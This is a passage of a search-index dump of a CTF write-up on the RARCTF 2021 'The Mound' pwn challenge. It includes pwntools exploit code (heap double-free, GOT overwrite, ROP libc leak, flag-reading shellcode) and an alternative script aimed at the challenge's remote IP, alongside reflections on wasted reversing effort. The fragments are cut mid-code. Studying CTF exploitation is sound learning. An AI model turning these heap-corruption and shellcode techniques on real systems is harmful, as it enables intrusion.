sc+= 'jne loop\\n' # step 3: open the flag file, read to _somewhere_ (mound_arena.base), and write to stdout sc+= 'lea rbx, [rax-0x20]\\n' sc+= 'mov rax, QWORD PTR [{}]\\n'.format(mound_data.base) sc+= shellcraft.openat('rax', 'rbx', 0) sc+= shellcraft.read('rax', mound_arena.base, FLAG_LEN) sc+= shellcraft.write(1, mound_arena.base, FLAG_LEN) sc = asm(sc) # don't call asm() twice add(1+csize2midx(request2size(len(sc))), 8, sc) # dump shellcode somewhere in mound_data for later use # The Obvious Solution: mcache dup --\u003e mound_arena.top overwrite --\u003e GOT table edit to win() def rm_id(id: int): # remove an arbitrary 56-bit id from mound_arena.ids[] strdup(b'a'*0x17, 5) strdup(b'a'*0x17, 6) edit(midxs.prev_size_editor, pack(r64())[:7].rjust(0x17, b'a')) free(midxs.fakeid_provider) edit(midxs.prev_size_editor, pack(id)[:7].rjust(0x17,b'a')) add(midxs.strdup, 7, b'a'*0x10) for _ in range(3): r64bit() # There have been 3 rand64bit() calls so far; account for them. while 1: # try adding until there's an ID with a null MSB add(midxs.mcache_dup, 0xf, b'hi') if not ((chunk_id := r64bit()) \u003e\u003e 56): break free(0xf) rm_id(chunk_id) free(0xf) # mcache dup add(midxs.mcache_dup, 0xe, fit(mound_data.mcache, mound_arena.mcache-0x10)) # overwrite -\u003enext add(midxs.mcache_dup, 0xd, 'hi') add(midxs.mcache_dup, 0xc, fit(mound_data.mcache, context.binary.got['setvbuf'])) # overwrite .top add(midxs.got_overwriter, 0xb, pack(context.binary.sym.win)) # overwrite got['scanf'] # win() will execute. Leak libc in the first cycle. R = ROP(context.binary) R.raw(0x48*b'a') R.puts(context.binary.got['read']) R.win() r.sendlineafter(';)\\n', R.chain()) context.libc.symbols['rea","date":"9090-08-08","objectID":"/survey/rarctf-2021-the-mound/:6:2","tags":["writeup","pwn"],"title":"Getting things wrong: How I spent 24-hours on a beginner's CTF pwn","uri":"/survey/rarctf-2021-the-mound/"},{"categories":["CTF"],"content":"Mistakes [Content warning: unsubstantiated opinions] ","date":"9090-08-08","objectID":"/survey/rarctf-2021-the-mound/:7:0","tags":["writeup","pwn"],"title":"Getting things wrong: How I spent 24-hours on a beginner's CTF pwn","uri":"/survey/rarctf-2021-the-mound/"},{"categories":["CTF"],"content":"I. Pwn isn’t RE CTF pwn binaries are usually small enough to fully reverse engineer, and The Mound was no exception. But the reversing effort always arrives with the cost of Time. The entire section of this writeup dedicated to understanding the heap implementation was written during the 36-hours between me starting this challenge and mound.py spitting out the flag. The assumption I’ve been rolling with, in all of the pwnables do, is that boosting time(reversing binaries) will pay off by a comparable reduction in time(scripting and debugging). That belief didn’t work out for this challenge. At the end of the main() reversing effort, I noted that I observed a few Bad Things going on in the switch-cases. So I spent a thousand-or-so words reversing the interworkings of the mound to understand that sending a glibc pointer to mfree() tends to produce Double free exit(1) calls as a result of a null prev_size. Do you know how else I could’ve discovered that? By just testing out the damn thing and getting a backtrace: gdb.attach(r, gdbscript='b exit\\nc') strdup(b'hi', 0) free(0) r.interactive() Oh, look! It stops in find_id(). Which only stops because *((void*)p-0x10) == NULL for the p in mfree(p). So I should probably find a way to edit prev_size for one of the strdup()’d pointers. Five minutes to figure out something I spent 5 hours in IDA Pro for. There are situations where a myopic focus on testing crashes might not work out, but The Mound is certainly not one of them. I can’t speak for ptr-yudai, but judging by his long article on adapting fuzzing techniques for CTF pwnables, I expect that there’s a lot more to gain from a lucid application of dynamic analysis than there is from my oddball approach of eyeballing everything I can in IDA until something sticks. I might re-evaluate this section if someone comes around with a really fast CTF Reversing strategy, but until then: ","date":"9090-08-08","objectID":"/survey/rarctf-2021-the-mound/:7:1","tags":["writeup","pwn"],"title":"Getting things wrong: How I spent 24-hours on a beginner's CTF pwn","uri":"/survey/rarctf-2021-the-mound/"},{"categories":["CTF"],"content":"II. Pattern matching CTF challenges are full of patterns and trends. When one popular CTF introduces a unique challenge, other CTFs tend to ape6 after the original design. v8 challenges are a good example of this: Prior to 2018, nothing. This year, there’s already been 4+ CTFs with v8 challenges. Compare this with a graph of Chrome’s market share: The IRL relevance of v8 hasn’t changed (much), so what gives? There’s a good comparison to be made between CTF trends and memetic reproduction. An established CTF comes up with an interesting challenge design. A decade or so ago, this might’ve been “Return Oriented Programming”. Go back a few years and you’ll see everyone interested in nifty House of * exploits. In the past few years, there’s been an obsession with things like v8 oobs and printf() one-shots. This is an intentionally broad picture; the trends I’ve listed here are cherry-picked obvious ones. There are smaller, less identifiable trends, and these weaker trends are a part of why I went down the weird exploit path I did for The Mound. Instinctively, I try to pull meta-games using the trends I observe. If it’s a v8 challenge, I try to get an oob JSArray, even though that kind of stuff is a lot harder with contemporary security measures. If there’s a text input, I’ll bash in \"A\"*0x1000 for the sake of it. And if there’s a special number that’ll produce a negative array index — a smaller pattern that I’ve unfortunately internalised — I’ll do my best to shape my exploit into abusing it, even if I have to use more powerful primitives to get there. It was with this bias that I approached The Mound, even after I learnt how to double-free a mound allocated chunk. I understood on a subconscious level that a double-free was almost certainly a more powerful tool than what I wanted to swing it around for (incrementing mcache-\u003ecounts[]), but if it follows what I’ve seen before, I have an expectation that things will go the same way. I’ll admit that this is a little bit theoretical, but I would have saved a lot of time if I could’ve just convinced myself to abort with the mcache-\u003eentries[-1] exploit path early on. I’m not exactly sure what I can do to prevent this kind of thing in the future, either. Something that deserves more thought. ","date":"9090-08-08","objectID":"/survey/rarctf-2021-the-mound/:7:2","tags":["writeup","pwn"],"title":"Getting things wrong: How I spent 24-hours on a beginner's CTF pwn","uri":"/survey/rarctf-2021-the-mound/"},{"categories":["CTF"],"content":"III. Things I haven’t considered? I could be doing pwn in sub-optimal ways I can’t identify as sub-optimal on my own. I’m hoping that other writeups on this challenge (if they arrive) can provide the kind of external insight on how challenges can be solved faster. That’s it. ","date":"9090-08-08","objectID":"/survey/rarctf-2021-the-mound/:7:3","tags":["writeup","pwn"],"title":"Getting things wrong: How I spent 24-hours on a beginner's CTF pwn","uri":"/survey/rarctf-2021-the-mound/"},{"categories":["CTF"],"content":"Footnotes This isn’t particularly useful. There’s no way to leak pointers outside of win(). I tried looking for seeds that would produce repeated cycles: from ctypes import CDLL LIBC = CDLL('libc.so.6') t = LIBC.time(0) t \u0026= 0xffffffffffff0000 for i in range(t,t+0xffff): LIBC.srand(i) seen = set(LIBC.rand() for j in range(0x1000)) if len(seen) \u003c 0xff0: print(i, len(seen)) The script found nothing. In case you’re wondering how there’s a pseudocode reference to mound_arena.mcache-\u003eentries[], as opposed to an ugly red *(_QWORD *)(MEMORY[0xDEAD0008008] + 8 * (v3 + 2LL) + 8) reference: Define the mound_metadata class (and the other structs from here) in the Structures tab; you should see an entry like this in the local types tab (Shift+F1): In the IDA View tab, select Edit --\u003e Segments --\u003e Create Segment; fill the pop-up window with sensible values put a variable at mound_arena:00000DEAD0000000 and retype it (Y) as a mound_metadata. The code block there isn’t supposed to make sense. Throughout the writeup, I’ve tried to keep declarations and variables consistent across code snippets, but getting this code to match with everything else in the writeup is just a little bit intractable. This is the reason why I ended up searching for the intended solution. My silly alternative method for getting to win() doesn’t work on remote; the time cost associated with a single connection – let alone bruteforcing the PID – makes it impossible to increment mcache-\u003eentries[-1] without an absurdly low ping. The 30x number comes from a crude measure of how many times the exploit calls choose(). For the intended solution, it’s about a hundred. The negative indexing process takes around ~3000 calls on average, and this shakes out to an exploit duration of around 15 minutes per guess on remote. Feel free to try it out youself: from random import randint from collections import namedtuple from ctypes import CDLL from tqdm import tqdm from pwnscripts import * BEEF, DEAD = 0xbeef0000000, 0xdead0000000 mound_arena = namedtuple('mound_metadata', 'base ids mcache top')(DEAD, DEAD+0x8, DEAD+0x8008, DEAD+0x8010) mound_data = namedtuple('beef', 'base mcache dents shellcode')(BEEF, BEEF+0x10, BEEF+0x10000, BEEF+0x100) midxs = namedtuple('midb', 'prev_size_editor fakeid_provider strdup mcache_dup got_overwriter')(5, 6, 0, 1, 2) context.binary = 'mound' context.libc = 'libc.so.6' libc = CDLL('libc.so.6') t = libc.time(0) if args.REMOTE: r = remote('193.57.159.27', 41932) #r = remote('localhost', 8329) libc.srand(t^int(args.PID)) # bruteforce PID else: r = context.binary.process() libc.srand(t^r.pid) # I/O methods def choose(opt: int): r.sendlineafter(b'\u003e ', str(opt)) def strdup(s: bytes, i: int): choose(1) r.sendafter(b'Pile: ', s) r.sendlineafter(b'index: ', str(i)) def add(midx: int, idx: int, s: bytes): choose(2) sz = midx2rsize(midx) assert sz \u003c 0x1000 assert len(s) \u003c= sz r.sendlineafter('pile: ', str(sz)) r.sendlineafter('index: ', str(idx)) r.sendafter('Pile: ', s) def edit(idx: int, s: bytes): choose(3) r.sendlineafter('index: ', str(idx)) r.sendafter('pile: ', s) def free(idx: int): choose(4) r.sendlineafter('index: ', str(idx)) def csize2midx(x:int): return (x\u003e\u003e4)-2 def midx2csize(i:int): return (i+2)\u003c\u003c4 def size2request(x:int): return x-0x10 def request2size(x:int): return x+0x10 def midx2rsize(i:int): return size2request(midx2csize(i)) def r64bit(): return libc.rand()+(libc.rand()\u003c\u003c32) # emulate rand64bit def r64(): return randint(0, (1\u003c\u003c64)-1) # a separate, unrelated function to produce random numbers midxs = namedtuple('midb', 'first_alloc overflower incrementer fakechunk bugged got_overwriter entries')(1, 4, 0, 2, -1, 3, 0x10) mound_data = namedtuple('beef', 'base mcache fakechunk dents shellcode')(BEEF, BEEF+0x10, BEEF+0x100, BEEF+0x10000, BEEF+0x190) def fake_mcache_entry(sz: int, fd=0, rid=None, mcache=mound_data.mcache): if rid is None: rid = r64() return fit(rid, sz, mcache, fd) add(midxs.first_alloc, 0, fake_mcache_entry(sz=midx2csize(midxs.fakec","date":"9090-08-08","objectID":"/survey/rarctf-2021-the-mound/:8:0","tags":["writeup","pwn"],"title":"Getting things wrong: How I spent 24-hours on a beginner's CTF pwn","uri":"/survey/rarctf-2021-the-mound/"}]